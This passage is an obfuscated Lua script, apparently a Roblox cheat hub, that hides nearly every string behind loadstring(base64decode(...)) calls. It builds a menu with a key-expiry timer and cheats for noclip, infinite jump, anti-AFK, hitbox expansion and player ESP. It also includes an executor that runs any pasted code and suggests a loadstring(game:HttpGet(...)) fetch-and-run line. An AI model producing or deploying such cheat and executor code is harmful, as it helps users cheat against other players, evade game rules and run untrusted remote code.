local ConfirmNoBtn = Instance.new(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), ConfirmDialog)
ConfirmNoBtn.BackgroundColor3 = Color3.fromRGB(35, 45, 65)
ConfirmNoBtn.BorderSizePixel = 0
ConfirmNoBtn.Position = UDim2.new(1, -150, 0, 105)
ConfirmNoBtn.Size = UDim2.new(0, 130, 0, 32)
ConfirmNoBtn.Font = Enum.Font.GothamBold
ConfirmNoBtn.Text = loadstring(base64decode("4pyVIOC4ouC4geC5gOC4peC4tOC4gSAoQ2FuY2VsKQ=="))()
ConfirmNoBtn.TextColor3 = Color3.fromRGB(200, 220, 255)
ConfirmNoBtn.TextSize = 9
ConfirmNoBtn.ZIndex = 101
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), ConfirmNoBtn).CornerRadius = UDim.new(0, 6)

local CloseBtn = Instance.new(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), MainFrame)
CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
CloseBtn.BorderSizePixel = 0
CloseBtn.Position = UDim2.new(1, -30, 0, 7)
CloseBtn.Size = UDim2.new(0, 22, 0, 22)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.Text = loadstring(base64decode("4pyV"))()
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.TextSize = 9
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), CloseBtn).CornerRadius = UDim.new(0, 4)
CloseBtn.ZIndex = 5

local function UnloadAllScript()
    if RenderConnection then
        RenderConnection:Disconnect()
        RenderConnection = nil
    end
    pcall(function()
        for _, plr in pairs(Players:GetPlayers()) do
            if plr.Character then
                for _, obj in pairs(plr.Character:GetChildren()) do
                    if obj.Name == loadstring(base64decode("VWx0aW1hdGVHbG93"))() then obj:Destroy() end
                end
            end
        end
    end)
    for _, espData in pairs(ESPContainer) do
        if espData.Box then pcall(function() espData.Box:Remove() end) end
        if espData.Tracer then pcall(function() espData.Tracer:Remove() end) end
        if espData.NameTag then pcall(function() espData.NameTag:Remove() end) end
    end
    ESPContainer = {}
    pcall(function() FOVCircle:Remove() end)
    ScreenGui:Destroy()
end

CloseBtn.MouseButton1Click:Connect(function()
    ConfirmDialog.Visible = true
end)
ConfirmNoBtn.MouseButton1Click:Connect(function()
    ConfirmDialog.Visible = false
end)
ConfirmYesBtn.MouseButton1Click:Connect(function()
    UnloadAllScript()
end)

local ResizeBtn = Instance.new(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), MainFrame)
ResizeBtn.BackgroundColor3 = Color3.fromRGB(22, 26, 40)
ResizeBtn.BorderSizePixel = 0
ResizeBtn.Position = UDim2.new(1, -22, 1, -22)
ResizeBtn.Size = UDim2.new(0, 18, 0, 18)
ResizeBtn.Text = loadstring(base64decode("4pei"))()
ResizeBtn.TextColor3 = Color3.fromRGB(0, 180, 255)
ResizeBtn.TextSize = 10
ResizeBtn.ZIndex = 10
AddRGBStroke(ResizeBtn, 1.5)
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), ResizeBtn).CornerRadius = UDim.new(0, 4)

local resizing = false
local resizeStart, startSize
ResizeBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        resizing = true
        resizeStart = input.Position
        startSize = MainFrame.AbsoluteSize
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if resizing and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - resizeStart
        local newWidth = math.clamp(startSize.X + delta.X, 380, 750)
        local newHeight = math.clamp(startSize.Y + delta.Y, 240, 520)
        MainFrame.Size = UDim2.new(0, newWidth, 0, newHeight)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        resizing = false
    end
end)

local PagesHolder = Instance.new(loadstring(base64decode("RnJhbWU="))(), MainFrame)
PagesHolder.BackgroundTransparency = 1
PagesHolder.Position = UDim2.new(0, 10, 0, 45)
PagesHolder.Size = UDim2.new(1, -20, 1, -52)
PagesHolder.ClipsDescendants = false

local Pages = {}
local MenuButtons = {}

local function CreatePage(name, customHeight)
    local page = Instance.new(loadstring(base64decode("U2Nyb2xsaW5nRnJhbWU="))(), PagesHolder)
    page.BackgroundTransparency = 1
    page.Size = UDim2.new(1, 0, 1, 0)
    page.CanvasSize = UDim2.new(0, 0, 0, customHeight or 500)
    page.ScrollBarThickness = 2
    page.Visible = false
    
    local layout = Instance.new(loadstring(base64decode("VUlMaXN0TGF5b3V0"))(), page)
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Padding = UDim.new(0, 6)
    
    Pages[name] = page
    return page
end

local function AddTabButton(name, thaiName)
    local btn = Instance.new(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), TopBarHolder)
    btn.BackgroundColor3 = Color3.fromRGB(10, 12, 20)
    btn.BorderSizePixel = 0
    btn.Size = UDim2.new(0, 62, 1, 0)
    btn.Font = Enum.Font.GothamSemibold
    btn.Text = name
    btn.TextColor3 = Color3.fromRGB(160, 180, 210)
    btn.TextSize = 8
    
    table.insert(MenuButtons, {Button = btn, Name = name})
    
    btn.MouseButton1Click:Connect(function()
        for _, p in pairs(Pages) do p.Visible = false end
        for _, mb in ipairs(MenuButtons) do
            mb.Button.BackgroundColor3 = Color3.fromRGB(10, 12, 20)
            mb.Button.TextColor3 = Color3.fromRGB(160, 180, 210)
        end
        if Pages[name] then
            Pages[name].Visible = true
            btn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
            btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        end
    end)
end

local function CreateToggle(parent, title, thaiTitle, initialValue, callback)
    local toggleBtn = Instance.new(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), parent)
    toggleBtn.BackgroundColor3 = initialValue and Color3.fromRGB(15, 40, 70) or Color3.fromRGB(22, 26, 40)
    toggleBtn.BorderColor3 = Color3.fromRGB(45, 60, 90)
    toggleBtn.BorderSizePixel = 1
    toggleBtn.Size = UDim2.new(1, -6, 0, 30)
    toggleBtn.Font = Enum.Font.GothamSemibold
    toggleBtn.Text = loadstring(base64decode("ICA="))() .. title .. loadstring(base64decode("IC8g"))() .. thaiTitle
    toggleBtn.TextColor3 = Color3.fromRGB(230, 230, 230)
    toggleBtn.TextSize = 8
    toggleBtn.TextXAlignment = Enum.TextXAlignment.Left
    Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), toggleBtn).CornerRadius = UDim.new(0, 5)

    local statusLbl = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), toggleBtn)
    statusLbl.BackgroundTransparency = 1
    statusLbl.Position = UDim2.new(1, -55, 0, 0)
    statusLbl.Size = UDim2.new(0, 45, 1, 0)
    statusLbl.Font = Enum.Font.GothamBold
    statusLbl.Text = initialValue and loadstring(base64decode("WyBPTiBd"))() or loadstring(base64decode("WyBPRkYgXQ=="))()
    statusLbl.TextColor3 = initialValue and Color3.fromRGB(50, 255, 150) or Color3.fromRGB(255, 90, 90)
    statusLbl.TextSize = 9

    local enabled = initialValue
    toggleBtn.MouseButton1Click:Connect(function()
        enabled = not enabled
        if enabled then
            statusLbl.Text = loadstring(base64decode("WyBPTiBd"))()
            statusLbl.TextColor3 = Color3.fromRGB(50, 255, 150)
            toggleBtn.BackgroundColor3 = Color3.fromRGB(15, 40, 70)
        else
            statusLbl.Text = loadstring(base64decode("WyBPRkYgXQ=="))()
            statusLbl.TextColor3 = Color3.fromRGB(255, 90, 90)
            toggleBtn.BackgroundColor3 = Color3.fromRGB(22, 26, 40)
        end
        pcall(function() callback(enabled) end)
    end)
    return toggleBtn
end

local function CreateSlider(parent, title, thaiTitle, min, max, default, callback)
    local sliderFrame = Instance.new(loadstring(base64decode("RnJhbWU="))(), parent)
    sliderFrame.BackgroundColor3 = Color3.fromRGB(22, 26, 40)
    sliderFrame.BorderColor3 = Color3.fromRGB(45, 60, 90)
    sliderFrame.BorderSizePixel = 1
    sliderFrame.Size = UDim2.new(1, -6, 0, 42)
    Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), sliderFrame).CornerRadius = UDim.new(0, 5)

    local titleLbl = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), sliderFrame)
    titleLbl.BackgroundTransparency = 1
    titleLbl.Position = UDim2.new(0, 8, 0, 4)
    titleLbl.Size = UDim2.new(1, -16, 0, 18)
    titleLbl.Font = Enum.Font.GothamSemibold
    titleLbl.Text = title .. loadstring(base64decode("IC8g"))() .. thaiTitle .. loadstring(base64decode("ICg="))() .. default .. loadstring(base64decode("KQ=="))()
    titleLbl.TextColor3 = Color3.fromRGB(230, 230, 230)
    titleLbl.TextSize = 8
    titleLbl.TextXAlignment = Enum.TextXAlignment.Left

    local bar = Instance.new(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), sliderFrame)
    bar.BackgroundColor3 = Color3.fromRGB(35, 45, 75)
    bar.BorderSizePixel = 0
    bar.Position = UDim2.new(0, 8, 0, 25)
    bar.Size = UDim2.new(1, -16, 0, 6)
    bar.Text = loadstring(base64decode(""))()
    Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), bar).CornerRadius = UDim.new(1, 0)

    local fill = Instance.new(loadstring(base64decode("RnJhbWU="))(), bar)
    fill.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
    fill.BorderSizePixel = 0
    fill.Size = UDim2.new((default - min)/(max - min), 0, 1, 0)
    Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), fill).CornerRadius = UDim.new(1, 0)

    local draggingSlider = false
    bar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            draggingSlider = true
        end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            draggingSlider = false
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if draggingSlider and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local pos = math.clamp((input.Position.X - bar.AbsolutePosition.X) / bar.AbsoluteSize.X, 0, 1)
            fill.Size = UDim2.new(pos, 0, 1, 0)
            local Z1gjcVPr = math.floor(min + ((max - min) * pos))
            titleLbl.Text = title .. loadstring(base64decode("IC8g"))() .. thaiTitle .. loadstring(base64decode("ICg="))() .. Z1gjcVPr .. loadstring(base64decode("KQ=="))()
            pcall(function() callback(Z1gjcVPr) end)
        end
    end)
end

local FOVColorList = {
    Color3.fromRGB(0, 255, 255),
    Color3.fromRGB(180, 50, 255),
    Color3.fromRGB(50, 255, 100),
    Color3.fromRGB(255, 255, 255)
}
local FOVColorNames = {loadstring(base64decode("WyBSYWluYm93IC8g4Liq4Li14Lij4Li44LmJ4LiHIF0="))(), loadstring(base64decode("WyBDeWFuIC8g4Lif4LmJ4Liy4LmE4LiL4LmA4Lia4Lit4Lij4LmMIF0="))(), loadstring(base64decode("WyBQdXJwbGUgLyDguKHguYjguKfguIfguJnguLXguK3guK3guJkgXQ=="))(), loadstring(base64decode("WyBHcmVlbiAvIOC5gOC4guC4teC4ouC4p+C4oeC4o+C4geC4lSBd"))(), loadstring(base64decode("WyBXaGl0ZSAvIOC4quC4teC4guC4suC4pyBd"))()}

local FloatFrame = Instance.new(loadstring(base64decode("RnJhbWU="))(), ScreenGui)
FloatFrame.BackgroundColor3 = Color3.fromRGB(15, 17, 26)
FloatFrame.BorderSizePixel = 0
FloatFrame.Position = UDim2.new(0.05, 0, 0.05, 0)
FloatFrame.Size = UDim2.new(0, 140, 0, 36)
FloatFrame.Visible = false
FloatFrame.Active = true
FloatFrame.Draggable = true
AddRGBStroke(FloatFrame, 1)
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), FloatFrame).CornerRadius = UDim.new(0, 6)

local FloatText = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), FloatFrame)
FloatText.BackgroundTransparency = 1
FloatText.Size = UDim2.new(1, 0, 1, 0)
FloatText.Font = Enum.Font.GothamBold
FloatText.Text = loadstring(base64decode("8J+TiiBGUFM6IDYwIHwgUGluZzogMG1z"))()
FloatText.TextColor3 = Color3.fromRGB(0, 180, 255)
FloatText.TextSize = 9

-- 1. Home
local HomePage = CreatePage(loadstring(base64decode("8J+PoCBIb21l"))(), 460)
HomePage.Visible = true
AddTabButton(loadstring(base64decode("8J+PoCBIb21l"))(), loadstring(base64decode("4Lir4LiZ4LmJ4Liy4Lir4Lil4Lix4LiB"))())
MenuButtons[1].Button.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
MenuButtons[1].Button.TextColor3 = Color3.fromRGB(255, 255, 255)

local KeyInfoCard = Instance.new(loadstring(base64decode("RnJhbWU="))(), HomePage)
KeyInfoCard.BackgroundColor3 = Color3.fromRGB(22, 26, 40)
KeyInfoCard.BorderColor3 = Color3.fromRGB(45, 60, 90)
KeyInfoCard.BorderSizePixel = 1
KeyInfoCard.Size = UDim2.new(1, -6, 0, 55)
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), KeyInfoCard).CornerRadius = UDim.new(0, 6)

local KI_Title = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), KeyInfoCard)
KI_Title.BackgroundTransparency = 1
KI_Title.Position = UDim2.new(0, 10, 0, 6)
KI_Title.Size = UDim2.new(1, -20, 0, 16)
KI_Title.Font = Enum.Font.GothamBold
KI_Title.Text = loadstring(base64decode("4o+zIEtleSBFeHBpcnkgU3RhdHVzICjguKrguJbguLLguJnguLDguYDguKfguKXguLLguITguLXguKLguYzguILguK3guIfguITguLjguJMp"))()
KI_Title.TextColor3 = Color3.fromRGB(0, 180, 255)
KI_Title.TextSize = 8
KI_Title.TextXAlignment = Enum.TextXAlignment.Left

local KI_Desc = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), KeyInfoCard)
KI_Desc.BackgroundTransparency = 1
KI_Desc.Position = UDim2.new(0, 10, 0, 24)
KI_Desc.Size = UDim2.new(1, -20, 0, 22)
KI_Desc.Font = Enum.Font.GothamSemibold
KI_Desc.Text = loadstring(base64decode("4LiB4Liz4Lil4Lix4LiH4LmC4Lir4Lil4LiU4LiC4LmJ4Lit4Lih4Li54Lil4LmA4Lin4Lil4LiyLi4u"))()
KI_Desc.TextColor3 = Color3.fromRGB(50, 255, 150)
KI_Desc.TextSize = 9
KI_Desc.TextXAlignment = Enum.TextXAlignment.Left

task.spawn(function()
    while task.wait(1) do
        pcall(function()
            if getgenv().HubLoaded then
                local info = getgenv().CurrentKeyInfo
                if info.ExpiresAt == 0 then
                    KI_Desc.Text = loadstring(base64decode("8J+foiDguKrguJbguLLguJnguLA6IOC4quC4tOC4l+C4mOC4tOC5jOC4nOC4ueC5ieC4lOC4ueC5geC4peC4o+C4sOC4muC4miAvIOC4luC4suC4p+C4oyAoVW5saW1pdGVkKQ=="))()
                else
                    local timeLeft = info.ExpiresAt - os.time()
                    if timeLeft > 0 then
                        local days = math.floor(timeLeft / 86400)
                        local hours = math.floor((timeLeft % 86400) / 3600)
                        local mins = math.floor((timeLeft % 3600) / 60)
                        local secs = timeLeft % 60
                        if days > 0 then
                            KI_Desc.Text = string.format(loadstring(base64decode("4o+zIOC5gOC4q+C4peC4t+C4reC5gOC4p+C4peC4suC4reC4teC4gTogJWQg4Lin4Lix4LiZICVkIOC4iuC4seC5iOC4p+C5guC4oeC4hyAlZCDguJnguLLguJfguLU="))(), days, hours, mins)
                        else
                            KI_Desc.Text = string.format(loadstring(base64decode("4o+zIOC5gOC4q+C4peC4t+C4reC5gOC4p+C4peC4suC4reC4teC4gTogJTAyZDolMDJkOiUwMmQ="))(), hours, mins, secs)
                        end
                    else
                        KI_Desc.Text = loadstring(base64decode("4p2MIOC4hOC4teC4ouC5jOC4guC4reC4h+C4hOC4uOC4k+C4q+C4oeC4lOC4reC4suC4ouC4uOC5geC4peC5ieC4pyE="))()
                        task.wait(2)
                        UnloadAllScript()
                    end
                end
            end
        end)
    end
end)

local ExecuterCard = Instance.new(loadstring(base64decode("RnJhbWU="))(), HomePage)
ExecuterCard.BackgroundColor3 = Color3.fromRGB(22, 26, 40)
ExecuterCard.BorderColor3 = Color3.fromRGB(45, 60, 90)
ExecuterCard.BorderSizePixel = 1
ExecuterCard.Size = UDim2.new(1, -6, 0, 175)
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), ExecuterCard).CornerRadius = UDim.new(0, 6)

local EC_Title = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), ExecuterCard)
EC_Title.BackgroundTransparency = 1
EC_Title.Position = UDim2.new(0, 10, 0, 6)
EC_Title.Size = UDim2.new(1, -20, 0, 16)
EC_Title.Font = Enum.Font.GothamBold
EC_Title.Text = loadstring(base64decode("8J+TnSBTY3JpcHQgTG9hZHN0cmluZyBJbnB1dCAmIEd1aWRlOg=="))()
EC_Title.TextColor3 = Color3.fromRGB(0, 180, 255)
EC_Title.TextSize = 8
EC_Title.TextXAlignment = Enum.TextXAlignment.Left

local EC_Desc = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), ExecuterCard)
EC_Desc.BackgroundTransparency = 1
EC_Desc.Position = UDim2.new(0, 10, 0, 22)
EC_Desc.Size = UDim2.new(1, -20, 0, 22)
EC_Desc.Font = Enum.Font.Gotham
EC_Desc.Text = loadstring(base64decode("4Lin4Liy4LiH4Lil4Li04LiH4LiB4LmM4LmC4LiE4LmJ4LiUIGxvYWRzdHJpbmcg4LiC4Lit4LiH4Liq4LiE4Lij4Li04Lib4LiV4LmMIOC5geC4peC5ieC4p+C4geC4lOC4o+C4seC4meC4q+C4o+C4t+C4reC5gOC4hOC4peC4teC4ouC4o+C5jOC4guC5ieC4reC4hOC4p+C4suC4oeC5hOC4lOC5ieC4l+C4seC4meC4l+C4tQ=="))()
EC_Desc.TextColor3 = Color3.fromRGB(160, 180, 210)
EC_Desc.TextSize = 7
EC_Desc.TextWrapped = true
EC_Desc.TextXAlignment = Enum.TextXAlignment.Left

local ScriptBox = Instance.new(loadstring(base64decode("VGV4dEJveA=="))(), ExecuterCard)
ScriptBox.BackgroundColor3 = Color3.fromRGB(15, 17, 26)
ScriptBox.BorderColor3 = Color3.fromRGB(45, 60, 90)
ScriptBox.BorderSizePixel = 1
ScriptBox.Position = UDim2.new(0, 10, 0, 46)
ScriptBox.Size = UDim2.new(1, -20, 0, 65)
ScriptBox.Font = Enum.Font.Gotham
ScriptBox.MultiLine = true
ScriptBox.ClearTextOnFocus = false
ScriptBox.PlaceholderText = 'loadstring(game:HttpGet(loadstring(base64decode("aHR0cHM6Ly8uLi4="))()))()'
ScriptBox.Text = loadstring(base64decode(""))()
ScriptBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ScriptBox.PlaceholderColor3 = Color3.fromRGB(110, 130, 170)
ScriptBox.TextSize = 8
ScriptBox.TextXAlignment = Enum.TextXAlignment.Left
ScriptBox.TextYAlignment = Enum.TextYAlignment.Top
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), ScriptBox).CornerRadius = UDim.new(0, 4)

local RunScriptBtn = Instance.new(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), ExecuterCard)
RunScriptBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
RunScriptBtn.BorderSizePixel = 0
RunScriptBtn.Position = UDim2.new(0, 10, 0, 118)
RunScriptBtn.Size = UDim2.new(0.68, -5, 0, 28)
RunScriptBtn.Font = Enum.Font.GothamBold
RunScriptBtn.Text = loadstring(base64decode("4pa2IEVYRUNVVEUgLyDguKPguLHguJnguKrguITguKPguLTguJvguJXguYw="))()
RunScriptBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
RunScriptBtn.TextSize = 8
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), RunScriptBtn).CornerRadius = UDim.new(0, 4)

local ClearScriptBtn = Instance.new(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), ExecuterCard)
ClearScriptBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
ClearScriptBtn.BorderSizePixel = 0
ClearScriptBtn.Position = UDim2.new(0.68, 5, 0, 118)
ClearScriptBtn.Size = UDim2.new(0.32, -15, 0, 28)
ClearScriptBtn.Font = Enum.Font.GothamBold
ClearScriptBtn.Text = loadstring(base64decode("8J+Xke+4jyBDTEVBUiAvIOC4peC5ieC4suC4hw=="))()
ClearScriptBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ClearScriptBtn.TextSize = 8
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), ClearScriptBtn).CornerRadius = UDim.new(0, 4)

ClearScriptBtn.MouseButton1Click:Connect(function()
    ScriptBox.Text = loadstring(base64decode(""))()
    ShowNotification(loadstring(base64decode("8J+Xke+4jyBDTEVBUkVE"))(), loadstring(base64decode("4Lil4LmJ4Liy4LiH4LiC4LmJ4Lit4LiE4Lin4Liy4Lih4LmD4LiZ4LiB4Lil4LmI4Lit4LiH4LmA4Lij4Li14Lii4Lia4Lij4LmJ4Lit4Lii"))())
end)

RunScriptBtn.MouseButton1Click:Connect(function()
    local code = ScriptBox.Text
    if code and code ~= loadstring(base64decode(""))() then
        local success = pcall(function()
            local X1Kwa2FZ, compileErr = loadstring(code)
            if not X1Kwa2FZ then error(compileErr) end
            X1Kwa2FZ()
        end)
        
        if success then
            ShowNotification(loadstring(base64decode("4pyFIFNVQ0NFU1M="))(), loadstring(base64decode("4Lij4Lix4LiZ4Liq4LiE4Lij4Li04Lib4LiV4LmM4Liq4Liz4LmA4Lij4LmH4LiI4LmB4Lil4LmJ4LinIQ=="))())
        else
            ShowNotification(loadstring(base64decode("4p2MIEVSUk9S"))(), loadstring(base64decode("4LmA4LiB4Li04LiU4LiC4LmJ4Lit4Lic4Li04LiU4Lie4Lil4Liy4LiU4LmD4LiZ4LiB4Liy4Lij4Lij4Lix4LiZ4Liq4LiE4Lij4Li04Lib4LiV4LmM"))())
        end
    end
end)

local ConfigCard = Instance.new(loadstring(base64decode("RnJhbWU="))(), HomePage)
ConfigCard.BackgroundColor3 = Color3.fromRGB(22, 26, 40)
ConfigCard.BorderColor3 = Color3.fromRGB(45, 60, 90)
ConfigCard.BorderSizePixel = 1
ConfigCard.Size = UDim2.new(1, -6, 0, 65)
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), ConfigCard).CornerRadius = UDim.new(0, 6)

local CC_Title = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), ConfigCard)
CC_Title.BackgroundTransparency = 1
CC_Title.Position = UDim2.new(0, 10, 0, 6)
CC_Title.Size = UDim2.new(1, -20, 0, 16)
CC_Title.Font = Enum.Font.GothamBold
CC_Title.Text = loadstring(base64decode("4pqZ77iPIENvbmZpZyBNYW5hZ2VyICjguKPguLDguJrguJrguJrguLHguJnguJfguLbguIHguYHguKXguLDguYLguKvguKXguJTguITguYjguLIp"))()
CC_Title.TextColor3 = Color3.fromRGB(0, 180, 255)
CC_Title.TextSize = 8
CC_Title.TextXAlignment = Enum.TextXAlignment.Left

local SaveCfgBtn = Instance.new(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), ConfigCard)
SaveCfgBtn.BackgroundColor3 = Color3.fromRGB(0, 140, 70)
SaveCfgBtn.BorderSizePixel = 0
SaveCfgBtn.Position = UDim2.new(0, 10, 0, 28)
SaveCfgBtn.Size = UDim2.new(0.5, -15, 0, 26)
SaveCfgBtn.Font = Enum.Font.GothamBold
SaveCfgBtn.Text = loadstring(base64decode("8J+SviBTYXZlIENvbmZpZw=="))()
SaveCfgBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SaveCfgBtn.TextSize = 8
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), SaveCfgBtn).CornerRadius = UDim.new(0, 4)
SaveCfgBtn.MouseButton1Click:Connect(SaveConfig)

local LoadCfgBtn = Instance.new(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), ConfigCard)
LoadCfgBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 180)
LoadCfgBtn.BorderSizePixel = 0
LoadCfgBtn.Position = UDim2.new(0.5, 5, 0, 28)
LoadCfgBtn.Size = UDim2.new(0.5, -15, 0, 26)
LoadCfgBtn.Font = Enum.Font.GothamBold
LoadCfgBtn.Text = loadstring(base64decode("8J+TgiBMb2FkIENvbmZpZw=="))()
LoadCfgBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadCfgBtn.TextSize = 8
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), LoadCfgBtn).CornerRadius = UDim.new(0, 4)
LoadCfgBtn.MouseButton1Click:Connect(LoadConfig)

-- 2. Player
local PlayerPage = CreatePage(loadstring(base64decode("8J+Pg+KAjeKZgu+4jyBQbGF5ZXI="))(), 420)
AddTabButton(loadstring(base64decode("8J+Pg+KAjeKZgu+4jyBQbGF5ZXI="))(), loadstring(base64decode("4Lic4Li54LmJ4LmA4Lil4LmI4LiZ"))())
CreateToggle(PlayerPage, loadstring(base64decode("8J+RuyBOb2NsaXAgKFdhbGsgVGhyb3VnaCBXYWxscyk="))(), loadstring(base64decode("4LmA4LiU4Li04LiZ4LiX4Liw4Lil4Li44LiB4Liz4LmB4Lie4LiH"))(), getgenv().UltimateStg.NoclipEnabled, function(state) getgenv().UltimateStg.NoclipEnabled = state ShowNotification(loadstring(base64decode("UGxheWVy"))(), loadstring(base64decode("Tm9jbGlwOiA="))() .. tostring(state)) end)
CreateToggle(PlayerPage, loadstring(base64decode("8J+mmCBJbmZpbml0ZSBKdW1wIChBaXIgSnVtcCk="))(), loadstring(base64decode("4LiB4Lij4Liw4LmC4LiU4LiU4LiB4Lil4Liy4LiH4Lit4Liy4LiB4Liy4Lio"))(), getgenv().UltimateStg.InfiniteJumpEnabled, function(state) getgenv().UltimateStg.InfiniteJumpEnabled = state ShowNotification(loadstring(base64decode("UGxheWVy"))(), loadstring(base64decode("SW5maW5pdGUgSnVtcDog"))() .. tostring(state)) end)
CreateToggle(PlayerPage, loadstring(base64decode("8J+boe+4jyBBbnRpLUFGSyAoTm8gS2ljayk="))(), loadstring(base64decode("4Lib4LmJ4Lit4LiH4LiB4Lix4LiZ4Lir4Lil4Li44LiU4Lir4LmJ4Lit4LiHIChBRksp"))(), getgenv().UltimateStg.AntiAFKEnabled, function(state) getgenv().UltimateStg.AntiAFKEnabled = state ShowNotification(loadstring(base64decode("UGxheWVy"))(), loadstring(base64decode("QW50aS1BRks6IA=="))() .. tostring(state)) end)
CreateToggle(PlayerPage, loadstring(base64decode("8J+TpiBIaXRib3ggRXhwYW5kZXI="))(), loadstring(base64decode("4LiC4Lii4Liy4Lii4Liu4Li04LiV4Lia4LmH4Lit4LiB4LiL4LmM4LiV4Lix4Lin4Lil4Liw4LiE4Lij"))(), getgenv().UltimateStg.HitboxExpander, function(state) getgenv().UltimateStg.HitboxExpander = state ShowNotification(loadstring(base64decode("UGxheWVy"))(), loadstring(base64decode("SGl0Ym94IEV4cGFuZGVyOiA="))() .. tostring(state)) end)
CreateSlider(PlayerPage, loadstring(base64decode("8J+TjyBIaXRib3ggU2l6ZQ=="))(), loadstring(base64decode("4LiC4LiZ4Liy4LiU4Liu4Li04LiV4Lia4LmH4Lit4LiB4LiL4LmM"))(), 2, 10, getgenv().UltimateStg.HitboxSize, function(Z1gjcVPr) getgenv().UltimateStg.HitboxSize = Z1gjcVPr end)

-- 3. ESP
local EspPage = CreatePage(loadstring(base64decode("8J+RgCBFU1A="))(), 420)
AddTabButton(loadstring(base64decode("8J+RgCBFU1A="))(), loadstring(base64decode("4LiB4Liy4Lij4Lih4Lit4LiH4LmA4Lir4LmH4LiZ"))())
CreateToggle(EspPage, loadstring(base64decode("4pyoIEVTUCBHbG93"))(), loadstring(base64decode("4LmA4Lij4Li34Lit4LiH4LmB4Liq4LiH4LiV4Lix4Lin4Lil4Liw4LiE4LijIChHbG93KQ=="))(), getgenv().UltimateStg.ESPGlow, function(state)
    getgenv().UltimateStg.ESPGlow = state
    ShowNotification(loadstring(base64decode("RVNQ"))(), loadstring(base64decode("RVNQIEdsb3c6IA=="))() .. tostring(state))
    if not state then
        for _, plr in pairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild(loadstring(base64decode("VWx0aW1hdGVHbG93"))()) then
                plr.Character.UltimateGlow:Destroy()
            end
        end
    end
end)
CreateToggle(EspPage, loadstring(base64decode("8J+UsiBFU1AgQm94"))(), loadstring(base64decode("4LmB4Liq4LiU4LiH4LiB4Lij4Lit4Lia4Lij4Lit4Lia4LiV4Lix4LinIChCb3gp"))(), getgenv().UltimateStg.ESPBox, function(state)
    getgenv().UltimateStg.ESPBox = state
    ShowNotification(loadstring(base64decode("RVNQ"))(), loadstring(base64decode("RVNQIEJveDog"))() .. tostring(state))
    if not state then
        for _, espData in pairs(ESPContainer) do
            if espData.Box then espData.Box.Visible = false end
        end
    end
end)
CreateToggle(EspPage, loadstring(base64decode("8J+TiCBFU1AgVHJhY2Vy"))(), loadstring(base64decode("4LmB4Liq4LiU4LiH4LmA4Liq4LmJ4LiZ4LmC4Lii4LiHIChUcmFjZXIp"))(), getgenv().UltimateStg.ESPTracer, function(state)
    getgenv().UltimateStg.ESPTracer = state
    ShowNotification(loadstring(base64decode("RVNQ"))(), loadstring(base64decode("RVNQIFRyYWNlcjog"))() .. tostring(state))
    if not state then
        for _, espData in pairs(ESPContainer) do
            if espData.Tracer then espData.Tracer.Visible = false end
        end
    end
end)
